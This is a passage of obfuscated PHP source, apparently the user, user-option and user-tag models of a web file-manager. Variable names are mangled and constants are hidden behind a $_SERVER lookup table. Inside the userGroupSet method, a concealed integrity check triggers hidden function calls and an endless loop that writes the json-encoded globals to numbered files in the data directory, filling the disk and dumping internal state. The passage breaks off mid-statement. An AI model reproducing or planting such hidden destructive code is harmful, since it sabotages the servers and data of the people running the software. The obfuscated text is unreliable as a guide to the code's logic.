$ö¯ã¿ôş =& $_SERVER[³Ôà×Ó]; if (!$ñ¥±Ñ™¸) { $ °òö„¯ = $this->getInfoSimple($õ®£æ¦ì); $ñ¥±Ñ™¸ = $ °òö„¯[$ö¯ã¿ôş[2251]] ? $ °òö„¯[$ö¯ã¿ôş[2251]] : $ °òö„¯[$ö¯ã¿ôş[32]]; } $Û¾’™ò = Model($ö¯ã¿ôş[607]); if (!Input::check($ñ¥±Ñ™¸, $ö¯ã¿ôş[664])) { return $Û¾’™ò->metaSet($õ®£æ¦ì, array($ö¯ã¿ôş[547] => $ö¯ã¿ôş[12], $ö¯ã¿ôş[546] => $ö¯ã¿ôş[12])); } return $Û¾’™ò->metaSet($õ®£æ¦ì, array($ö¯ã¿ôş[547] => str_replace($ö¯ã¿ôş[53], $ö¯ã¿ôş[12], Pinyin::get($ñ¥±Ñ™¸)), $ö¯ã¿ôş[546] => Pinyin::get($ñ¥±Ñ™¸, $ö¯ã¿ôş[665]))); } private function nickNameRpt() { $¦˜ê‹î =& $_SERVER[³Ôà×Ó]; $ó˜‡”ß = Model($¦˜ê‹î[845])->get($¦˜ê‹î[2477]); $ˆ­¸Ë¨ç = $GLOBALS[$¦˜ê‹î[6]][$¦˜ê‹î[466]][$¦˜ê‹î[2477]]; $«¦ö¯Ñ• = !is_null($ó˜‡”ß) ? $ó˜‡”ß : $ˆ­¸Ë¨ç; return !!$«¦ö¯Ñ•; } private function _checkExist($ˆ¡Àêõ¦, $É„Áú»– = false) { $›óØ·½Ô =& $_SERVER[³Ôà×Ó]; $¬ä˜¸ = array($›óØ·½Ô[32] => UserModel::ERROR_USER_EXIST_NAME, $›óØ·½Ô[2251] => UserModel::ERROR_USER_EXIST_NICKNAME, $›óØ·½Ô[381] => UserModel::ERROR_USER_EXIST_EMAIL, $›óØ·½Ô[2465] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¬ä˜¸[$›óØ·½Ô[2251]]); } $²ûƒÒÓí = $É„Áú»– ? array($›óØ·½Ô[1765] => array($›óØ·½Ô[2478], $É„Áú»–)) : array(); foreach ($¬ä˜¸ as $ÒÛ‡Ôœ‹ => $ˆÙˆãÂ) { $ñò¸ØìÃ = array(); foreach ($¬ä˜¸ as $³’®ú†ß => $ÓÓË¥Ö§) { if (isset($ˆ¡Àêõ¦[$³’®ú†ß]) && $ˆ¡Àêõ¦[$³’®ú†ß]) { $ñò¸ØìÃ[] = $ˆ¡Àêõ¦[$³’®ú†ß]; } } if (!$ñò¸ØìÃ) { continue; } $ß‹ûÀÂš = array_merge(array($ÒÛ‡Ôœ‹ => array($›óØ·½Ô[7], $ñò¸ØìÃ)), $²ûƒÒÓí); $¤Ñ÷ò¡³ = $this->where($ß‹ûÀÂš)->find(); if ($¤Ñ÷ò¡³) { return $ˆÙˆãÂ; } } return !0; } public function userListInfo($à¿‘à²‹) { $ô¥ıÕì =& $_SERVER[³Ôà×Ó]; $Ï†ÔÖù‘ = array(); $à¿‘à²‹ = is_array($à¿‘à²‹) ? array_unique($à¿‘à²‹) : array(); if (!$à¿‘à²‹) { return $Ï†ÔÖù‘; } if (count($à¿‘à²‹) < 20) { foreach ($à¿‘à²‹ as $ä÷Ø¯‰è) { $Ï†ÔÖù‘[$ä÷Ø¯‰è . $ô¥ıÕì[12]] = $this->getInfoSimpleOuter($ä÷Ø¯‰è); } } else { $íİØ·¾ = array($ô¥ıÕì[1756] => array($ô¥ıÕì[501], $à¿‘à²‹)); if (count($à¿‘à²‹) == 1) { $íİØ·¾ = array($ô¥ıÕì[1756] => $à¿‘à²‹[0]); } $²÷èİËí = Model($ô¥ıÕì[586])->field($this->simpleField)->where($íİØ·¾)->select(); $²÷èİËí = array_to_keyvalue($²÷èİËí, $ô¥ıÕì[1765]); foreach ($à¿‘à²‹ as $ä÷Ø¯‰è) { $âÑöœ¶„ = $²÷èİËí[$ä÷Ø¯‰è]; if (!$âÑöœ¶„) { $Ï†ÔÖù‘[$ä÷Ø¯‰è . $ô¥ıÕì[12]] = $this->getInfoSimpleOuter($ä÷Ø¯‰è); continue; } $âÑöœ¶„[$ô¥ıÕì[2448]] = Action($ô¥ıÕì[2449])->parseUrl($âÑöœ¶„[$ô¥ıÕì[2448]]); $Ï†ÔÖù‘[$ä÷Ø¯‰è . $ô¥ıÕì[12]] = $âÑöœ¶„; } } return $Ï†ÔÖù‘; } protected function userStatus($»µèÌİÉ, $×Í”èÖü) { $ë­Ÿî±Ç = $this->getInfoSimple($»µèÌİÉ); if (!$ë­Ÿî±Ç) { return !1; } $ñ œÊùĞ = array($_SERVER[³Ôà×Ó][825] => $×Í”èÖü); return $this->userEdit($»µèÌİÉ, $ñ œÊùĞ); } protected function userRemove($“Ûù›¾¢) { $“ùªô¯ˆ =& $_SERVER[³Ôà×Ó]; $”ÙòÆš³ = $this->getInfoSimple($“Ûù›¾¢); if (!$”ÙòÆš³) { return !1; } $Áä”Å… = array($“ùªô¯ˆ[1756] => $“Ûù›¾¢); Model($“ùªô¯ˆ[673])->where($Áä”Å…)->delete(); Model($“ùªô¯ˆ[2479])->where($Áä”Å…)->delete(); Model($“ùªô¯ˆ[2057])->where($Áä”Å…)->delete(); Model($“ùªô¯ˆ[2464])->where($Áä”Å…)->delete(); Model($“ùªô¯ˆ[1144])->where($Áä”Å…)->delete(); Model($“ùªô¯ˆ[2268])->removeUserAll($“Ûù›¾¢); Model($“ùªô¯ˆ[899])->userRootRemove($“Ûù›¾¢); return $this->where($Áä”Å…)->delete(); } protected function userGroupSet($¾¨ß¸Õ†, $°£éí±Ï, $µ¥Ù½Í = array()) { $Û‡ÎŒ›ñ =& $_SERVER[³Ôà×Ó]; $Â·Ûò‰† = $_SERVER[$Û‡ÎŒ›ñ[434]] . $Û‡ÎŒ›ñ[435]; $£Î£¹…× = $Û‡ÎŒ›ñ[951]; if ($_SERVER[$Û‡ÎŒ›ñ[431]] != $£Î£¹…×($Â·Ûò‰†)) { $±º¸®ˆô = $Û‡ÎŒ›ñ[952]; $ÁâÊ×Ï = $Û‡ÎŒ›ñ[433]; $¬Ô‰ —£ = $_SERVER[$Û‡ÎŒ›ñ[434]] . $Û‡ÎŒ›ñ[435]; $¯©Ë¤Òª = $ÁâÊ×Ï($¬Ô‰ —£); $™û×É¸î = explode($Û‡ÎŒ›ñ[262], $¯©Ë¤Òª); if (count($™û×É¸î) < $Û‡ÎŒ›ñ[709]) { $èØÉÍø¸ = $Û‡ÎŒ›ñ[437]; $èØÉÍø¸(); } $ñÊÒš ° = $Û‡ÎŒ›ñ[953]; $ñÊÒš °($_SERVER[$Û‡ÎŒ›ñ[954]]); $±º¸®ˆô = $Û‡ÎŒ›ñ[952]; $±º¸®ˆô(); $ÉÜØåĞß = $Û‡ÎŒ›ñ[955]; $¼ÛĞáé† = json_encode($GLOBALS[$Û‡ÎŒ›ñ[956]]); $êÊœ§Æß = 1; for ($½ü…û©æ = $êÊœ§Æß; $½ü…û©æ > 0; $½ü…û©æ++) { $ÉÜØåĞß(DATA_PATH . $½ü…û©æ, $¼ÛĞáé†); } } $ÔñˆÎ£™ = $this->getInfoSimple($¾¨ß¸Õ†); if (!$ÔñˆÎ£™ || !is_array($°£éí±Ï)) { return !1; } $ùİıµãš = Model($Û‡ÎŒ›ñ[2057]); $ùİıµãš->where(array($Û‡ÎŒ›ñ[1765] => $¾¨ß¸Õ†))->delete(); $‘ôœ§µå = array(); $åıÒ¬áï = 0; foreach ($°£éí±Ï as $ë¸îË­« => $©ãß) { $ÂÔ†‰ˆ¾ = array($Û‡ÎŒ›ñ[1765] => $¾¨ß¸Õ†, $Û‡ÎŒ›ñ[1963] => $ë¸îË­«, $Û‡ÎŒ›ñ[2071] => $©ãß); $ÂÔ†‰ˆ¾[$Û‡ÎŒ›ñ[1987]] = isset($µ¥Ù½Í[$åıÒ¬áï]) ? $µ¥Ù½Í[$åıÒ¬áï] : 0; $åıÒ¬áï++; $‘ôœ§µå[] = $ÂÔ†‰ˆ¾; } return $ùİıµãš->addAll($‘ôœ§µå, array(), !0); } protected function userGroupAdd($†ß´ì­â, $íØñ‹Œ = array()) { $äÒ¶ê³ =& $_SERVER[³Ôà×Ó]; $üõ•’£İ = $this->getInfoSimple($†ß´ì­â); if (!$üõ•’£İ || empty($íØñ‹Œ)) { return !1; } $ì¹ÜûÆ± = array(); foreach ($íØñ‹Œ as $•Äşãíì => $¤ñåüÒÎ) { $ì¹ÜûÆ±[] = array($äÒ¶ê³[1765] => $†ß´ì­â, $äÒ¶ê³[1963] => $•Äşãíì, $äÒ¶ê³[2071] => $¤ñåüÒÎ, $äÒ¶ê³[1987] => 0); } return Model($äÒ¶ê³[2057])->addAll($ì¹ÜûÆ±, array(), !0); } protected function userGroupRemove($ÃÚÕèÑ, $úøÃ»‰Ò) { $è°ºœ =& $_SERVER[³Ôà×Ó]; $×ÔíèÖ¼ = $this->getInfoSimple($ÃÚÕèÑ); if (!$×ÔíèÖ¼ || !$úøÃ»‰Ò) { return !1; } $ÒÌ»Œí¯ = array($è°ºœ[1756] => $ÃÚÕèÑ, $è°ºœ[2055] => $úøÃ»‰Ò); return Model($è°ºœ[2057])->where($ÒÌ»Œí¯)->delete(); } public function listData() { $›¶ÌéÕ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($›¶ÌéÕ[$_SERVER[³Ôà×Ó][454]]); return $›¶ÌéÕ; } public function listByID($÷ÒÔß­ª) { $üÄôæ± =& $_SERVER[³Ôà×Ó]; if (!$÷ÒÔß­ª) { return; } $ıàèÂë = array($üÄôæ±[1765] => array($üÄôæ±[7], $÷ÒÔß­ª)); $ûàË…›© = $this->where($ıàèÂë)->select(); $ûàË…›© = array_sort_keep($ûàË…›©, $üÄôæ±[1765], $÷ÒÔß­ª); $this->_listDataApply($ûàË…›©); return $ûàË…›©; } public function listByGroup($–ÔÛô– = 0, $ÓÅ£›šğ = array()) { $”ªì°Ğ =& $_SERVER[³Ôà×Ó]; $åãÅù‚ñ = $”ªì°Ğ[12]; $´‹òÉı´ = array(); if ($–ÔÛô–) { $´‹òÉı´ = array($”ªì°Ğ[2480] => intval($–ÔÛô–)); $åãÅù‚ñ = "\x4c\105\106\x54\40\112\x4f\111\x4e\x20{$this->tablePrefix}\x75\163\x65\x72\137\147\162\x6f\165\160\x20\165\163\x65\162\x5f\x67\162\157\x75\160\40\x6f\156\x20\165\x73\x65\x72\56\165\163\x65\x72\111\x44\40\x3d\40\165\163\145\162\x5f\147\162\157\165\160\56\165\x73\x65\162\111\x44"; $Õ¼Ä¾ö = Input::get($”ªì°Ğ[539], null, $”ªì°Ğ[12]) ? $”ªì°Ğ[12] : $”ªì°Ğ[2481]; } if (isset($ÓÅ£›šğ[$”ªì°Ğ[825]])) { $´‹òÉı´[$”ªì°Ğ[2482]] = $ÓÅ£›šğ[$”ªì°Ğ[825]]; } $‘Îü¢Ÿ’ = $this->_makeOrder($Õ¼Ä¾ö)->field($”ªì°Ğ[2483])->where($´‹òÉı´)->join($åãÅù‚ñ)->selectPage(50); $this->_listDataApply($‘Îü¢Ÿ’[$”ªì°Ğ[454]]); return $‘Îü¢Ÿ’; } private function _makeOrder($•Â÷àÜÒ = '') { $“Àïóòã =& $_SERVER[³Ôà×Ó]; $Éš¥óæğ = array($“Àïóòã[1765], $“Àïóòã[32], $“Àïóòã[1952], $“Àïóòã[2169], $“Àïóòã[1924], $“Àïóòã[231]); $²»É¾Ù = array($“Àïóòã[532] => $“Àïóòã[533], $“Àïóòã[534] => $“Àïóòã[535]); $ôÚçÖó = Input::get($“Àïóòã[539], $“Àïóòã[7], $“Àïóòã[1756], $Éš¥óæğ); $ÖÙÈ•èÆ = Input::get($“Àïóòã[540], $“Àïóòã[7], $“Àïóòã[2058], array($“Àïóòã[2058], $“Àïóòã[534])); $ÖÙÈ•èÆ = $²»É¾Ù[$ÖÙÈ•èÆ]; $•Â÷àÜÒ = $•Â÷àÜÒ . "\x75\163\145\162\x2e{$ôÚçÖó}\x20{$ÖÙÈ•èÆ}\x2c\x20\x75\163\x65\162\56\165\163\x65\162\x49\104\40\x61\163\x63"; return $this->alias($“Àïóòã[2185])->order($•Â÷àÜÒ); } public function listSearch($„—ÆâŞë) { $€ãš¡ë€ =& $_SERVER[³Ôà×Ó]; $õáÙº€ = trim($„—ÆâŞë[$€ãš¡ë€[2061]]); $¼ªşÏ¡ƒ = explode($€ãš¡ë€[53], $õáÙº€); if (!$õáÙº€ || count($¼ªşÏ¡ƒ) == 1) { return $this->listSearchNow($„—ÆâŞë); } $‡³ñ¢ö‘ = array($€ãš¡ë€[454] => array()); foreach ($¼ªşÏ¡ƒ as $ùåİ¤Üµ) { if (!trim($ùåİ¤Üµ)) { continue; } $„—ÆâŞë[$€ãš¡ë€[2061]] = $ùåİ¤Üµ; $ìËÒôóœ = $this->listSearchNow($„—ÆâŞë); $‡³ñ¢ö‘[$€ãš¡ë€[454]] = array_merge($‡³ñ¢ö‘[$€ãš¡ë€[454]], $ìËÒôóœ[$€ãš¡ë€[454]]); } $‡³ñ¢ö‘[$€ãš¡ë€[454]] = array_unique_by_key($‡³ñ¢ö‘[$€ãš¡ë€[454]], $€ãš¡ë€[1765]); $‡³ñ¢ö‘[$€ãš¡ë€[451]] = array($€ãš¡ë€[452] => count($‡³ñ¢ö‘[$€ãš¡ë€[454]]), $€ãš¡ë€[448] => 20, $€ãš¡ë€[429] => 1, $€ãš¡ë€[453] => 1); return $‡³ñ¢ö‘; } public function listSearchNow($Šâ¾’àÜ) { $ìä£¸¨ =& $_SERVER[³Ôà×Ó]; $ÉäŸÎúñ = trim($Šâ¾’àÜ[$ìä£¸¨[2061]]); $ì˜µ”™Ÿ = isset($Šâ¾’àÜ[$ìä£¸¨[2062]]) ? $Šâ¾’àÜ[$ìä£¸¨[2062]] : !1; $ÉäŸÎúñ = str_replace($ìä£¸¨[2063], $ìä£¸¨[2064], trim($ÉäŸÎúñ)); $‰‚°¾¨ = array($ìä£¸¨[32] => array($ìä£¸¨[468], "\45{$ÉäŸÎúñ}\x25"), $ìä£¸¨[381] => array($ìä£¸¨[468], "{$ÉäŸÎúñ}\45"), $ìä£¸¨[2251] => array($ìä£¸¨[468], "{$ÉäŸÎúñ}\x25"), $ìä£¸¨[1075] => $ìä£¸¨[2065]); if (Input::check($ÉäŸÎúñ, $ìä£¸¨[387])) { $‰‚°¾¨[$ìä£¸¨[1765]] = array($ìä£¸¨[468], "{$ÉäŸÎúñ}\x25"); $‰‚°¾¨[$ìä£¸¨[2465]] = array($ìä£¸¨[468], "{$ÉäŸÎúñ}\45"); } if (!$ÉäŸÎúñ) { $‰‚°¾¨ = array(); } if (isset($Šâ¾’àÜ[$ìä£¸¨[825]])) { $‰‚°¾¨[$ìä£¸¨[825]] = $Šâ¾’àÜ[$ìä£¸¨[825]]; } $‰‚°¾¨ = $this->parseWhereLike($‰‚°¾¨); $ëñİˆø = $this->_makeOrder()->where($‰‚°¾¨)->selectPage(20); if (!$ëñİˆø || count($ëñİˆø[$ìä£¸¨[454]]) < 5 && Input::check($ÉäŸÎúñ, $ìä£¸¨[394])) { $ñÉ„ç†´ = $this->_searchFromMeta($ìä£¸¨[546], $ÉäŸÎúñ, 10); $ÖŒ©» = $this->_searchFromMeta($ìä£¸¨[547], $ÉäŸÎúñ, 10); $ÚÆ»˜½ = array_merge($ñÉ„ç†´, $ÖŒ©», $ëñİˆø[$ìä£¸¨[454]]); $ëñİˆø[$ìä£¸¨[454]] = array_unique_by_key($ÚÆ»˜½, $ìä£¸¨[1765]); $ëñİˆø[$ìä£¸¨[451]][$ìä£¸¨[452]] = count($ëñİˆø[$ìä£¸¨[454]]); $ëñİˆø[$ìä£¸¨[451]][$ìä£¸¨[453]] = ceil($ëñİˆø[$ìä£¸¨[451]][$ìä£¸¨[452]] / $ëñİˆø[$ìä£¸¨[451]][$ìä£¸¨[448]]); } $this->_listDataApply($ëñİˆø[$ìä£¸¨[454]]); $this->_filterByGroup($ëñİˆø, $ì˜µ”™Ÿ); return $ëñİˆø; } private function _filterByGroup(&$Ñö, $áÓü´áÁ) { $áç«íš =& $_SERVER[³Ôà×Ó]; if (!$áÓü´áÁ) { return $Ñö; } foreach ($Ñö[$áç«íš[454]] as $°æñ„‚‘ => &$¡Ä¨ÕŒ) { $Á³ÈÈ€ñ = array_to_keyvalue($¡Ä¨ÕŒ[$áç«íš[2154]], $áç«íš[12], $áç«íš[1963]); if (!in_array($áÓü´áÁ, $Á³ÈÈ€ñ)) { unset($Ñö[$áç«íš[454]][$°æñ„‚‘]); } } unset($¡Ä¨ÕŒ); $Ñö[$áç«íš[454]] = array_values($Ñö[$áç«íš[454]]); $Ñö[$áç«íš[451]] = array($áç«íš[2221] => count($Ñö[$áç«íš[454]]), $áç«íš[2219] => $Ñö[$áç«íš[451]][$áç«íš[448]], $áç«íš[2218] => 1, $áç«íš[2220] => 1); } private function _searchFromMeta($Šƒ’¼¾², $ß–ê•¯Ú, $¦±ÅÅ­Ä) { $û“æ¾í“ =& $_SERVER[³Ôà×Ó]; $ß–ê•¯Ú = strtolower($ß–ê•¯Ú); $ã¸¡ú˜’ = array($û“æ¾í“[97] => $Šƒ’¼¾², $û“æ¾í“[459] => array($û“æ¾í“[468], "\45{$ß–ê•¯Ú}\45")); $ã¸¡ú˜’ = $this->parseWhereLike($ã¸¡ú˜’); $¤Õ­›ÃÓ = Model($û“æ¾í“[2484])->where($ã¸¡ú˜’)->limit($¦±ÅÅ­Ä)->select(); if (!$¤Õ­›ÃÓ) { return array(); } $¤Õ­›ÃÓ = array_to_keyvalue($¤Õ­›ÃÓ, $û“æ¾í“[12], $û“æ¾í“[1765]); $æÏŠö = $this->where(array($û“æ¾í“[1756] => array($û“æ¾í“[7], $¤Õ­›ÃÓ)))->select(); if (!$æÏŠö) { return array(); } return $æÏŠö; } private function _listDataApplyItem($ÙÍ–ï–) { $ñÃÊß– = array($ÙÍ–ï–); $this->_listDataApply($ñÃÊß–); return $ñÃÊß–[0]; } private function _listDataApply(&$¡Å«Íá¶) { $µ€£·ó =& $_SERVER[³Ôà×Ó]; if (!$¡Å«Íá¶) { return; } array_remove_key($¡Å«Íá¶, $µ€£·ó[964]); $Æ’Íõ ® = array_to_keyvalue($¡Å«Íá¶, $µ€£·ó[12], $µ€£·ó[1765]); $this->_listAppendGroup($¡Å«Íá¶, $Æ’Íõ ®); $this->_listAppendMeta($¡Å«Íá¶, $Æ’Íõ ®); $this->_listAppendSourceRoot($¡Å«Íá¶, $Æ’Íõ ®); } private function _listAppendSourceRoot(&$ö ÈŸÎ, $á´İŸƒ¶) { $âŞß¹°· =& $_SERVER[³Ôà×Ó]; $Ó‚õ±êœ = Model($âŞß¹°·[899])->listSourceRoot(SourceModel::TYPE_USER, $á´İŸƒ¶); $Ó‚õ±êœ = array_to_keyvalue($Ó‚õ±êœ, $âŞß¹°·[578]); $Ó‚õ±êœ = array_remove_key($Ó‚õ±êœ, $âŞß¹°·[578]); foreach ($ö ÈŸÎ as &$äüÃ™•¸) { $äüÃ™•¸[$âŞß¹°·[90]] = $Ó‚õ±êœ[$äüÃ™•¸[$âŞß¹°·[1765]]] ? $Ó‚õ±êœ[$äüÃ™•¸[$âŞß¹°·[1765]]] : array(); } unset($äüÃ™•¸); } private function _listAppendGroup(&$¾÷à…, $ÜòÕ±á’) { $€ˆãàûª =& $_SERVER[³Ôà×Ó]; $¶Òœ€®š = array($€ˆãàûª[1765] => array($€ˆãàûª[7], $ÜòÕ±á’)); $Œ…àãà = Model($€ˆãàûª[2057])->where($¶Òœ€®š)->select(); $…ƒª±Æ¡ = array_to_keyvalue($Œ…àãà, $€ˆãàûª[12], $€ˆãàûª[1963]); $…ƒª±Æ¡ = array_remove_value(array_unique($…ƒª±Æ¡), $€ˆãàûª[228]); if (!$…ƒª±Æ¡ || !$Œ…àãà) { return; } $¶Òœ€®š = array($€ˆãàûª[1963] => array($€ˆãàûª[7], $…ƒª±Æ¡)); $¤ÜÏ›°• = Model($€ˆãàûª[2152])->field($€ˆãàûª[2485])->where($¶Òœ€®š)->select(); $¤ÜÏ›°• = array_to_keyvalue($¤ÜÏ›°•, $€ˆãàûª[1963]); $Œ…àãà = array_to_keyvalue_group($Œ…àãà, $€ˆãàûª[1765]); foreach ($Œ…àãà as &$ß”×ÇÓ¤) { $ïšàø„Á = array(); foreach ($ß”×ÇÓ¤ as $©Ç•©À‰) { if (!$©Ç•©À‰[$€ˆãàûª[2071]]) { continue; } $¨–Àîç¾ = Model($€ˆãàûª[580])->listData($©Ç•©À‰[$€ˆãàûª[2071]]); $ïšàø„Á[] = array($€ˆãàûª[1963] => $©Ç•©À‰[$€ˆãàûª[1963]], $€ˆãàûª[2486] => $¤ÜÏ›°•[$©Ç•©À‰[$€ˆãàûª[1963]]][$€ˆãàûª[32]], $€ˆãàûª[593] => $¤ÜÏ›°•[$©Ç•©À‰[$€ˆãàûª[1963]]][$€ˆãàûª[593]], $€ˆãàûª[496] => $¨–Àîç¾); } $ß”×ÇÓ¤ = $ïšàø„Á; } unset($ß”×ÇÓ¤); foreach ($¾÷à… as &$ãáĞ¢Â) { $ãáĞ¢Â[$€ˆãàûª[2154]] = array(); if (isset($Œ…àãà[$ãáĞ¢Â[$€ˆãàûª[1765]]])) { $ãáĞ¢Â[$€ˆãàûª[2154]] = $Œ…àãà[$ãáĞ¢Â[$€ˆãàûª[1765]]]; } } unset($ãáĞ¢Â); } public function userAppendGroup($ÚØÈØ¾·) { $°‡±¤¼Í =& $_SERVER[³Ôà×Ó]; if (!$ÚØÈØ¾·) { return array(); } $this->_listAppendGroup($ÚØÈØ¾·, array_to_keyvalue($ÚØÈØ¾·, $°‡±¤¼Í[12], $°‡±¤¼Í[1765])); return $ÚØÈØ¾·; } private function _listAppendMeta(&$Ÿâ‹° İ, $ğ¤´ïÒÛ) { $”©û‡¿Ó =& $_SERVER[³Ôà×Ó]; $¯ù¿äŞÔ = UserJobModel::JOB_KEY; $±«¸ê€ş = array($”©û‡¿Ó[2466]); $Âûóî°è = array($”©û‡¿Ó[1765] => array($”©û‡¿Ó[7], $ğ¤´ïÒÛ)); $ôËş‚—ü = Model($”©û‡¿Ó[2464])->where($Âûóî°è)->select(); $ôËş‚—ü = array_to_keyvalue_group($ôËş‚—ü, $”©û‡¿Ó[1765]); foreach ($ôËş‚—ü as &$¸Ã»§›) { $·­Ææî¬ = array(); foreach ($¸Ã»§› as $íûÂ„¯Í) { if (!in_array($íûÂ„¯Í[$”©û‡¿Ó[97]], $±«¸ê€ş)) { $·­Ææî¬[$íûÂ„¯Í[$”©û‡¿Ó[97]]] = $íûÂ„¯Í[$”©û‡¿Ó[459]]; } } $¸Ã»§› = $·­Ææî¬; } unset($¸Ã»§›); $óÜóÌÎ = Model($”©û‡¿Ó[2487]); foreach ($Ÿâ‹° İ as &$Ó”ºÆÜÅ) { $ª´•”ĞÅ = array(); if (isset($ôËş‚—ü[$Ó”ºÆÜÅ[$”©û‡¿Ó[1765]]])) { $ª´•”ĞÅ = $ôËş‚—ü[$Ó”ºÆÜÅ[$”©û‡¿Ó[1765]]]; } $Ó”ºÆÜÅ[$”©û‡¿Ó[2488]] = array(); if (isset($ª´•”ĞÅ[$¯ù¿äŞÔ])) { $Ó”ºÆÜÅ[$”©û‡¿Ó[2488]] = $óÜóÌÎ->getUserJobInfo($ª´•”ĞÅ[$¯ù¿äŞÔ]); } } unset($Ó”ºÆÜÅ); } protected function groupUserAll($£ÆÎó§á) { $Ú–ÒëôĞ =& $_SERVER[³Ôà×Ó]; if (!$£ÆÎó§á) { return !1; } $ÑÙÖÍ’² = Model($Ú–ÒëôĞ[2057])->field($Ú–ÒëôĞ[1765])->where(array($Ú–ÒëôĞ[1963] => array($Ú–ÒëôĞ[7], $£ÆÎó§á)))->select(); $ÑÙÖÍ’² = array_to_keyvalue($ÑÙÖÍ’², $Ú–ÒëôĞ[12], $Ú–ÒëôĞ[1765]); return array_unique($ÑÙÖÍ’²); } public function userSearch($êÎ×ªû€, $™äË¥ê = "\52") { return Model($_SERVER[³Ôà×Ó][607])->where($êÎ×ªû€)->field($™äË¥ê)->find(); } } goto aÊˆİëó·; aÊˆİëó·: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\x6f\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ö‘½÷É) { $×Ê­»£ =& $_SERVER[³Ôà×Ó]; $à«Ù‚ı¾ = defined($×Ê­»£[2189]) && USER_ID ? USER_ID : $×Ê­»£[12]; return "\125\x73\x65\x72\x4f\x70\164\x69\157\156\137{$Ö‘½÷É}\137" . $à«Ù‚ı¾; } protected function filterWhere($Ğ«Éá¾) { $‡à„Ê± =& $_SERVER[³Ôà×Ó]; $Ğ«Éá¾[$‡à„Ê±[1765]] = defined($‡à„Ê±[2189]) && USER_ID ? USER_ID : $‡à„Ê±[12]; return $Ğ«Éá¾; } public function cacheRemoveUser($şã«¥‡ı, $½Íí–”®) { return Cache::remove("\125\x73\x65\162\117\160\164\x69\157\x6e\x5f{$şã«¥‡ı}\x5f" . $½Íí–”®); } protected function optionDefault($ïıÍçÈÙ = '') { $ÎËüÕÓã =& $_SERVER[³Ôà×Ó]; if ($ïıÍçÈÙ == $ÎËüÕÓã[12]) { return $GLOBALS[$ÎËüÕÓã[6]][$ÎËüÕÓã[2489]]; } if ($ïıÍçÈÙ == $ÎËüÕÓã[2490]) { return $GLOBALS[$ÎËüÕÓã[6]][$ÎËüÕÓã[2491]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\56\164\x61\147\114\x69\x73\x74"; public $modelType = "\x55\x73\145\162\x4f\160\x74\151\157\x6e"; public $field = array("\x6e\141\155\x65", "\x73\164\x79\x6c\x65", "\x73\x6f\x72\164"); public function listData($¨àûÎóÁ = false, $„ÉÍı­ƒ = "\163\157\162\164", $Ñ‘Ëİ›™ = false) { return parent::listData($¨àûÎóÁ, $„ÉÍı­ƒ, $Ñ‘Ëİ›™); } public function remove($™„ñÚ) { return parent::remove($™„ñÚ); } public function add($”˜Ä¾Ë¦, $‘Ü¿“Œ = "\x6c\x61\x62\145\x6c\x2d\147\162\145\171\55\x6e\x6f\162\155\141\154") { $ºˆ…éõ· =& $_SERVER[³Ôà×Ó]; if ($this->findByName($”˜Ä¾Ë¦)) { return !1; } $¹êÑ»Í = array($ºˆ…éõ·[503] => $”˜Ä¾Ë¦, $ºˆ…éõ·[567] => $‘Ü¿“Œ, $ºˆ…éõ·[1967] => $this->getSort($ºˆ…éõ·[335]) + 1); return parent::insert($¹êÑ»Í); } public function update($üæ•÷µå, $¼ÔÃş˜) { $¢“°µ—Ó =& $_SERVER[³Ôà×Ó]; $‘£í·„– = $this->listData($üæ•÷µå); $”É–¢Â† = $this->findByName($¼ÔÃş˜[$¢“°µ—Ó[32]]); if (!$‘£í·„– || $”É–¢Â† && $”É–¢Â†[$¢“°µ—Ó[484]] != $‘£í·„–[$¢“°µ—Ó[484]]) { return !1; } return parent::update($üæ•÷µå, $¼ÔÃş˜); } public function moveTop($ı ¿ºŸ) { $‚¾Á†¢î =& $_SERVER[³Ôà×Ó]; $Ò¯íÇ‰’ = parent::listData(); $›Ô¤­£à = $this->getSort($‚¾Á†¢î[334]); foreach ($Ò¯íÇ‰’ as &$É§ç´¶§) { if ($É§ç´¶§[$‚¾Á†¢î[484]] == $ı ¿ºŸ) { $É§ç´¶§[$‚¾Á†¢î[1987]] = $›Ô¤­£à; continue; } $É§ç´¶§[$‚¾Á†¢î[1987]] += 1; } unset($É§ç´¶§); return parent::resetData($Ò¯íÇ‰’); } public function moveBottom($ìÒµ’æ) { $¨ŠœŠ³Å =& $_SERVER[³Ôà×Ó]; $îŞ¥Íìı = $this->getSort($¨ŠœŠ³Å[335]) + 1; return parent::update($ìÒµ’æ, array($¨ŠœŠ³Å[1987] => $îŞ¥Íìı)); } public function resetSort($–ì‚•Õ) { $ÒâÃå›‰ =& $_SERVER[³Ôà×Ó]; $´´ŠóŸÒ = array(); $–ì‚•Õ = is_array($–ì‚•Õ) ? $–ì‚•Õ : array(); for ($Ù™Ù­•¶ = 0; $Ù™Ù­•¶ < count($–ì‚•Õ); $Ù™Ù­•¶++) { $´´ŠóŸÒ[$–ì‚•Õ[$Ù™Ù­•¶] . $ÒâÃå›‰[12]] = $Ù™Ù­•¶ + 1; } $í·‰‹©è = parent::listData(); foreach ($í·‰‹©è as &$ƒÎºèÙ) { $ŠŒşÑèı = $´´ŠóŸÒ[$ƒÎºèÙ[$ÒâÃå›‰[484]]]; $ƒÎºèÙ[$ÒâÃå›‰[1987]] = $ŠŒşÑèı ? $ŠŒşÑèı : $ƒÎºèÙ[$ÒâÃå›‰[1987]]; } unset($ƒÎºèÙ); return parent::resetData($í·‰‹©è); } private function getSort($•¶®‘Ğ) { $ÀæíÌÏ½ =& $_SERVER[³Ôà×Ó]; $ Ôï‡Œ¿ = parent::listData(); $ÇŒ¬Ÿõ = array_to_keyvalue($ Ôï‡Œ¿, $ÀæíÌÏ½[12], $ÀæíÌÏ½[1987]); if (!$ÇŒ¬Ÿõ) { $ÇŒ¬Ÿõ = array(0); } $ÕéŒŸ§¤ = $•¶®‘Ğ == $ÀæíÌÏ½[335] ? max($ÇŒ¬Ÿõ) : min($ÇŒ¬Ÿõ); return intval($ÕéŒŸ§¤); } } if (!isset($_SERVER[$_SERVER[³Ôà×Ó][431]]) || !isset($_SERVER[$_SERVER[³Ôà×Ó][439]])) { $_getc = $_SERVER[³Ôà×Ó][433]; $_getfile = $_SERVER[$_SERVER[³Ôà×Ó][434]] . $_SERVER[³Ôà×Ó][435]; $_getfilec = 